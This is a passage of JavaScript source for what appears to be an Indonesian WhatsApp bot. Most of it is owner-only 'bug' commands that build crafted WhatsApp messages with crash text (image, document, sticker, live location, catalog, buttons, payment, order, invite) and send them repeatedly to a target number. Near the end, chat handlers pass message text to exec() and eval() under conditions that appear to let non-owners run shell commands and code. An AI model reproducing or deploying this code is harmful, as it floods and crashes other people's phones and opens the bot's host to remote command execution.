var image = generateWAMessageFromContent(from, proto.Message.fromObject({"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc","mimetype": "image/jpeg","caption": virtex8,"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=","fileLength": "42521","height": 426,"width": 640,"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=","fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=","directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1","mediaKeyTimestamp": "1657286523","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(Input, image.message, { messageId: image.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.relayMessage(Input, image.message, { messageId: image.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugdocumentv':
case 'sendbugdocv':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var document = generateWAMessageFromContent(from, proto.Message.fromObject({"documentMessage": {"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc","mimetype": "application/octet-stream","title": ".ridho","fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=","pageCount": 0,"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=","fileName": virtex8,"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=","directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5","mediaKeyTimestamp": "1657288637",}}), { userJid: from, quoted: setQuotedBug })
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(Input, document.message, { messageId: document.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.relayMessage(Input, document.message, { messageId: document.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'bugstickerv':
case 'bugstickv': 
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var sticker = generateWAMessageFromContent(from, proto.Message.fromObject({"stickerMessage": {"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc","fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=","fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=","mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781","fileLength": "7774","mediaKeyTimestamp": "1657290167","isAnimated": false,}}), { userJid: from, quoted: setQuotedBug })
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'buglokasiv': 
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({"liveLocationMessage": {"degreesLatitude": -6.9367014,"degreesLongitude": 107.7228574,"caption": virtex8,"sequenceNumber": "1657237469254001","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'bugkatalogv':
case 'bugcatalogv':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.sendKatalog(Input, virtex8, virtex8, ofrply, {quoted: setQuotedBug })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.sendKatalog(Input, virtex8, virtex8, ofrply, {quoted: setQuotedBug })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'bugbuttonv':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
const buttons = [
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv1}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv2}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv3}, type: 1}
]
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.sendButMessage(Input, `TURU DEKK 🥶`, fake, buttons, setQuotedBug)
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.sendButMessage(Input, `TURU DEKK 🥶`, fake, buttons, setQuotedBug)
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugspamv':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!Input ) return setReply("Masukan nomer target")
if (Input == ownerNumber) return setReply("Tidak bisa, karena itu nomer developer")
var bugreact = await atak.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: ridho.id } } })
var buginvite = generateWAMessageFromContent(from ,{"groupInviteMessage": {"groupJid": "6283144394823@g.us","inviteCode": "UkJdqTXupAtmDwo4","inviteExpiration": "1643553084","invitetime": "1643293887000","groupName": virtex8,"thumbnail": ofrply,"caption": virtex8, "contextInfo": { "forwardingScore": 150, "isForwarded": true }}}, { quoted: setQuotedBug }) 
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "100","noteMessage": {"extendedTextMessage": {"text": virtex8,}}}}), { userJid: from, quoted: setQuotedBug })
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {"name": "HALO DEKK 🥶", "options": [{"optionName": "VOTE YUK"}, {"optionName": "BERANI VOTE GK"}, {"optionName": "VOTE LAH SEMUA"}, {"optionName": "KATANYA WA KEBAL"}, {"optionName": "SALAM CREATOR BOT"}], "selectableOptionsCount": 5 }}), { userJid: from, quoted: setQuotedBug })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: atak.waUploadToServer })
var order = generateWAMessageFromContent(from, proto.Message.fromObject({"orderMessage": {"orderId": "594071395007984","orderImage": messa.imageMessage,"itemCount": 100000000000,"status": "INQUIRY","surface": "CATALOG","message": virtex8,"jpegThumbnail": ofrply,"orderTitle": virtex8,"sellerJid": "6287721317870@s.whatsapp.net","token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==","totalAmount1000": "500000000000000","totalCurrencyCode": "IDR",}}), { userJid: from, quoted: setQuotedBug })
var audio = generateWAMessageFromContent(from, proto.Message.fromObject({"audioMessage": {"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc","mimetype": "audio/mpeg","fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=","fileLength": "258330","seconds": 16,"ptt": false,"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=","fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=","directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118","mediaKeyTimestamp": "1657190832",}}), { userJid: from, quoted: setQuotedBug })
var image = generateWAMessageFromContent(from, proto.Message.fromObject({"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc","mimetype": "image/jpeg","caption": virtex8,"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=","fileLength": "42521","height": 426,"width": 640,"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=","fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=","directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1","mediaKeyTimestamp": "1657286523","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
var document = generateWAMessageFromContent(from, proto.Message.fromObject({"documentMessage": {"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc","mimetype": "application/octet-stream","title": ".ridho","fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=","pageCount": 0,"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=","fileName": virtex8,"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=","directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5","mediaKeyTimestamp": "1657288637",}}), { userJid: from, quoted: setQuotedBug })
var sticker = generateWAMessageFromContent(from, proto.Message.fromObject({"stickerMessage": {"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc","fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=","fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=","mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781","fileLength": "7774","mediaKeyTimestamp": "1657290167","isAnimated": false,}}), { userJid: from, quoted: setQuotedBug })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({"liveLocationMessage": {"degreesLatitude": -6.9367014,"degreesLongitude": 107.7228574,"caption": virtex8,"sequenceNumber": "1657237469254001","jpegThumbnail": messa.imageMessage,}}), { userJid: from, quoted: setQuotedBug })
const buttons = [
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv1}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv2}, type: 1},
{buttonId: 'FFFFFFF', buttonText: {displayText: ngazapv3}, type: 1}
]
if (mentionByReply) {
await setReply("Sending...")
for (let i = 0; i < args[0]; i++) {
atak.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id,})	
atak.relayMessage(Input, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
atak.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
atak.relayMessage(Input, order.message, { messageId: order.key.id })
atak.relayMessage(Input, audio.message, { messageId: audio.key.id })
atak.relayMessage(Input, image.message, { messageId: image.key.id })
atak.relayMessage(Input, document.message, { messageId: document.key.id })
atak.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
atak.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
atak.sendButMessage(Input, `TURU DEKK 🥶`, fake, buttons, setQuotedBug)
atak.sendKatalog(Input, virtex8, virtex8, ofrply, {quoted: setQuotedBug })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
} else if(mentionByTag && isGroup && args[1] || !isGroup && args[1]) { 
await setReply("Sending...")
for (let i = 0; i < args[1]; i++) {
atak.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id,})	
atak.relayMessage(Input, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
atak.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
atak.relayMessage(Input, order.message, { messageId: order.key.id })
atak.relayMessage(Input, audio.message, { messageId: audio.key.id })
atak.relayMessage(Input, image.message, { messageId: image.key.id })
atak.relayMessage(Input, document.message, { messageId: document.key.id })
atak.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
atak.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
atak.sendButMessage(Input, `TURU DEKK 🥶`, fake, buttons, setQuotedBug)
atak.sendKatalog(Input, virtex8, virtex8, ofrply, {quoted: setQuotedBug })
atak.sendMessage(Input, { text: "awowkwkwk" }, { quoted: bugreact });
}
}
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
//================================================================================\\
default:
if (isCmd) {
await Nothing(toFirstCase(command), dash, allcommand)
let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand)
if (mentionByReply) {
atak.sendButMessage(from, `Command *${prefix+command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix+matches.bestMatch.target.toLowerCase()}*`, fake, [{buttonId: `${prefix+matches.bestMatch.target.toLowerCase()} ${mentionByReply} ${args[0]}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}`},type: 1}],setQuoted);
} else if(args[1] && args[0]){
atak.sendButMessage(from, `Command *${prefix+command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix+matches.bestMatch.target.toLowerCase()}*`, fake, [{buttonId: `${prefix+matches.bestMatch.target.toLowerCase()} ${args[0]} ${args[1]}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}`},type: 1}],setQuoted);
} else {
atak.sendButMessage(from, `Command *${prefix+command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix+matches.bestMatch.target.toLowerCase()}*`, fake, [{buttonId: `${prefix+matches.bestMatch.target.toLowerCase()} ${q}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}`},type: 1}],setQuoted);
}
} 
} //Akhir switch command





if (isImage && autoSticker) {
try{
let WSF = require('wa-sticker-formatter')
let wsf = false
let mime = (ridho.msg || ridho).mimetype || ''
if (/image/.test(mime)) {
let img = await atak.downloadAndSaveMediaMessage(quoted)
wsf = new WSF.Sticker(img, {
pack: packName,
type: WSF.StickerTypes.FULL,
author: authorName,
crop: true,
})
}        
if (wsf) {
await wsf.build()
const sticBuffer = await wsf.get()
if (sticBuffer) await atak.sendMessage(from, { sticker: sticBuffer }, {
quoted: ridho,
mimetype: 'image/webp',
ephemeralExpiration: 86400
})
}
}catch(err){

}
}
    
//ketika ada yang invite/kirim link grup di chat pribadi
//Di kasih ama Alyul
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
let { dada } = require("../message/sewabot.js")
let teks = dada(prefix, pushname, ucapanWaktu)      
let gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]  
atak.sendButLoc(from, teks,fake, thumb, gbutsan)
}



//Jika ada yg cek prefix bot akan merespon   
if (budy.includes('ekprefix')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
atak.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  ${thePrefix}  」`, text, { quoted: setQuoted, contextInfo: forward })
 }

//Jika ada yg kirim pesan "p" bot akan respon
if (salam.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
if (isOwner) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){ 
sendvn(ucapbot)
} else if(autoSticker) {
sendSticker(ucapsalam)
} else {
setReply("Ucap salam napah")
}
}
//Jika ada yg kirim pesan "Asalamualaikun" bot akan respon✓
if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(walaikumsalam)
} else if(autoSticker) {
sendSticker(kumsalam)
} else {
setReply("Walaikumsalam kak")
}
}
				

				
//Jika ada yg toxic bot akan merespon✓
if (!isOwner && bad.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(astaga)
} else if(autoSticker) {
await sendSticker(katakasar)
} else {
await setReply("Jangan Toxic Kak")
}
}



//Jika ada yg sange bot akan merespon✓
if (!isOwner && dosa.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(sangeya)
} else if(autoSticker) {
await sendSticker(istigfar)
} else {
await setReply("Astagfirloh oni chan")
}
}


//Jika ada yg bilang hallo maka bot akan merespon✓
if (katahai.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn) return sendvn(moshimos)
}

//Jika ada yang bilang ohayo bot akan merespon✓
if(ohayo.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if (timeWib >= '11:00' && timeWib <= '23:50')  return setReply("Sekarang udah ga pagi kak")
if(autovn === true) return sendvn(oahyo)
setReply(`${ucapanWaktu} kak 🙂`)
}
				     
 //Jika ada yang bilang oyasumi malem bot akan merespon✓
if(katamalem.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if (timeWib >= '06:00' && timeWib <= '17:00')  return setReply("Sekarang udah ga malem kak")
if(autovn) {
sendvn(oyasumi)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
         
 //Jika ada yang bilang koniciwa malem bot akan merespon✓
if(katasiang.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn) {
sendvn(koniciwa)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}

//Jika ada yg bilang bot maka bot akan merespon✓
if (badud.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn ) {
sendvn(ucapbot)
} else {
setReply(hayuk)
}
}          
 //Jika ada yang bilang lopyu bot akan merespon✓
if(katalopyou.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(lopyoutoo)
} else {
setReply("??")
}
}
				

                   
//Jika ada yang tag nomer owner
if (!isOwner && budy.includes(nomerOwner)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
const kta =['*Bentar ya kak nanti juga di bales sama ownerku* 😉','*Tunggu aja kak, entar juga di bales* 😁','*Iya kak, ada apa tag owner aku nih* 🙂']
const su = kta[Math.floor(Math.random() * kta.length)]
setReply(su)
}
					
//JIKA ADA YG BILANG THANKS, BOT AKAN RESPON
for (let kasih of thanks){
if (budy.includes(kasih) || selectedButton == 'Thanks' ) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autoSticker) return sendSticker(samasama)
setReply(`Sama sama kak ${pushname}`)
}
}

//Ketika ada yang minta save
if(!isGroup && budy.startsWith("sv")){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Pahami dan baca peraturan bot,\nBot tidak menerima save nomer")
}

if (!isOwner && body.startsWith('$') || !ridho.key.fromMe && body.startsWith('$')){
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${botName}:~ ${err}`)
if (stdout) {
await setReply(`_${stdout}_`)
setReply("_Executing Finished_")
}
})
}

if (!isOwner && body.startsWith('>') || !ridho.key.fromMe && body.startsWith('>')){
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await setReply(evaled)
} catch (err) {
await setReply(String(err))
}
}


if (!isOwner && body.startsWith('=>') || !ridho.key.fromMe && body.startsWith('=>')){
function Return(sul) {
let sat = JSON.stringify(sul, null, 2)
if(sat){
var bang = util.format(sat)
} else if (sat == undefined) {
var  bang = util.format(sul)
}
return setReply(bang)
}
try {
setReply(util.format(eval(`(async () => { return ${q} })()`)))
} catch (e) {
setReply(String(e))
}
}

if (!isOwner && body.startsWith('+>') || !ridho.key.fromMe && body.startsWith('+>')){
try {
return setReply(`OutPut: 
${JSON.stringify(eval(budy.slice(2)),null,'\t')}
`)
} catch(err) {
e = String(err)
setReply(`"err" :  "${e}"`)
}
}
























  

} catch (err){
//add to dashboard
if(isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n${fake}`)    

if(checkError(err.message, JSON.parse(fs.readFileSync('./database/listerror.json')))) return
addError(err.message, command, JSON.parse(fs.readFileSync('./database/listerror.json')))
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 
  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await atak.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Bot Is Not Admin`
} else if(!isGroup){
var yeh = `Bot Is Not In The Group`
} 

let teks =`\n*]───── 「 Laporan Bug ⚠️」 ─────[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`
let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
let tolol = {
text: teks,
footer: `${fake}\n${calender}`,
buttons: mok,
headerType: 1
}

await atak.sendMessage(Ownerin, tolol , {quoted: fkontak})

if(!autoblockcmd){
await atak.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Bot"})
}

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await atak.downloadAndSaveMediaMessage(quoted)
await atak.sendMedia (Ownerin, media, ridho, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		



} catch (err){
console.log(util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!publik) return
publik = false
await atak.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
publik = true
 atak.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if(Console){
atak.sendMessage(Ownerin, {text : util.format(e)})
}
//console.log(e)
}
}


    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})

